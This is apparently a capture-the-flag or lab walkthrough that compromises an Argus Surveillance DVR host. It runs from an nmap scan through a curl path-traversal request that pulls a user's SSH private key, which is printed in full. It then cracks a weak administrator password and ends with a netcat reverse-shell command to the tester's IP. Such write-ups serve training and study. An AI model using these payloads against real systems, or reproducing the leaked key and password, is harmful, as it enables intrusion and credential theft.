```
nmap -sC -sV -Pn -p- 192.168.169.179
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-20 21:54 CDT
Stats: 0:02:20 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 99.10% done; ETC: 21:57 (0:00:01 remaining)
Nmap scan report for 192.168.169.179
Host is up (0.044s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)
| ssh-hostkey: 
|   3072 2125f053b4990f34de2dcabc5dfe20ce (RSA)
|_  384 e796f36ad892075abf3706860a317319 (ECDSA)
8080/tcp open  http-proxy
|_http-title: Argus Surveillance DVR
|_http-generator: Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Connection: Keep-Alive
|     Keep-Alive: timeout=15, max=4
|     Content-Type: text/html
|     Content-Length: 985
|     <HTML>
|     <HEAD>
|     <TITLE>
|     Argus Surveillance DVR
|     </TITLE>
|     <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
|     <meta name="GENERATOR" content="Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]">
|     <frameset frameborder="no" border="0" rows="75,*,88">
|     <frame name="Top" frameborder="0" scrolling="auto" noresize src="CamerasTopFrame.html" marginwidth="0" marginheight="0"> 
|     <frame name="ActiveXFrame" frameborder="0" scrolling="auto" noresize src="ActiveXIFrame.html" marginwidth="0" marginheight="0">
|     <frame name="CamerasTable" frameborder="0" scrolling="auto" noresize src="CamerasBottomFrame.html" marginwidth="0" marginheight="0"> 
|     <noframes>
|     <p>This page uses frames, but your browser doesn't support them.</p>
|_    </noframes>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.93%I=7%D=7/20%Time=64B9F411%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,451,"HTTP/1\.1\x20200\x20OK\r\nConnection:\x20Keep-Alive\r\nKe
SF:ep-Alive:\x20timeout=15,\x20max=4\r\nContent-Type:\x20text/html\r\nCont
SF:ent-Length:\x20985\r\n\r\n<HTML>\r\n<HEAD>\r\n<TITLE>\r\nArgus\x20Surve
SF:illance\x20DVR\r\n</TITLE>\r\n\r\n<meta\x20http-equiv=\"Content-Type\"\
SF:x20content=\"text/html;\x20charset=ISO-8859-1\">\r\n<meta\x20name=\"GEN
SF:ERATOR\"\x20content=\"Actual\x20Drawing\x206\.0\x20\(http://www\.pysoft
SF:\.com\)\x20\[PYSOFTWARE\]\">\r\n\r\n<frameset\x20frameborder=\"no\"\x20
SF:border=\"0\"\x20rows=\"75,\*,88\">\r\n\x20\x20<frame\x20name=\"Top\"\x2
SF:0frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"CamerasTo
SF:pFrame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\x20\x20\r\n\
SF:x20\x20<frame\x20name=\"ActiveXFrame\"\x20frameborder=\"0\"\x20scrollin
SF:g=\"auto\"\x20noresize\x20src=\"ActiveXIFrame\.html\"\x20marginwidth=\"
SF:0\"\x20marginheight=\"0\">\r\n\x20\x20<frame\x20name=\"CamerasTable\"\x
SF:20frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"CamerasB
SF:ottomFrame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\x20\x20\
SF:r\n\x20\x20<noframes>\r\n\x20\x20\x20\x20<p>This\x20page\x20uses\x20fra
SF:mes,\x20but\x20your\x20browser\x20doesn't\x20support\x20them\.</p>\r\n\
SF:x20\x20</noframes>\r")%r(HTTPOptions,451,"HTTP/1\.1\x20200\x20OK\r\nCon
SF:nection:\x20Keep-Alive\r\nKeep-Alive:\x20timeout=15,\x20max=4\r\nConten
SF:t-Type:\x20text/html\r\nContent-Length:\x20985\r\n\r\n<HTML>\r\n<HEAD>\
SF:r\n<TITLE>\r\nArgus\x20Surveillance\x20DVR\r\n</TITLE>\r\n\r\n<meta\x20
SF:http-equiv=\"Content-Type\"\x20content=\"text/html;\x20charset=ISO-8859
SF:-1\">\r\n<meta\x20name=\"GENERATOR\"\x20content=\"Actual\x20Drawing\x20
SF:6\.0\x20\(http://www\.pysoft\.com\)\x20\[PYSOFTWARE\]\">\r\n\r\n<frames
SF:et\x20frameborder=\"no\"\x20border=\"0\"\x20rows=\"75,\*,88\">\r\n\x20\
SF:x20<frame\x20name=\"Top\"\x20frameborder=\"0\"\x20scrolling=\"auto\"\x2
SF:0noresize\x20src=\"CamerasTopFrame\.html\"\x20marginwidth=\"0\"\x20marg
SF:inheight=\"0\">\x20\x20\r\n\x20\x20<frame\x20name=\"ActiveXFrame\"\x20f
SF:rameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"ActiveXIFra
SF:me\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\r\n\x20\x20<fram
SF:e\x20name=\"CamerasTable\"\x20frameborder=\"0\"\x20scrolling=\"auto\"\x
SF:20noresize\x20src=\"CamerasBottomFrame\.html\"\x20marginwidth=\"0\"\x20
SF:marginheight=\"0\">\x20\x20\r\n\x20\x20<noframes>\r\n\x20\x20\x20\x20<p
SF:>This\x20page\x20uses\x20frames,\x20but\x20your\x20browser\x20doesn't\x
SF:20support\x20them\.</p>\r\n\x20\x20</noframes>\r");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 175.57 seconds

```

Went into the port 8080 site and found the Argus Surveillance DVR and found the below exploit.

```
https://www.exploit-db.com/exploits/45296
```

Using this combined with the user viewer, I was able to find a private key for the user.

```
curl "http://192.168.169.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fviewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

I was able to find the password mentioned in the github post: https://github.com/s3l33/CVE-2022-25012

I then found password0 for the administrator account and cracked it using the below exploit.

https://www.exploit-db.com/exploits/50130

```
─$ python 50130.py

#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############

[+] ECB4:1
[+] 53D1:4
[+] 6069:W
[+] F641:a
[+] E03B:t
[+] D9BD:c
[+] 956B:h
[+] FE36:D
[+] BD8F:0
[+] 3CD9:g
[-] D9A8:Unknown

```

Symbols are not in the list and after some guessing the password is `14WatchD0g$` I uploaded netcat to run the following command to reverse shell back.

```
runas /user:Administrator "C:\TEST\nc.exe -e cmd.exe 192.168.45.216 443"
```

I was able to get the reverse shell on 443.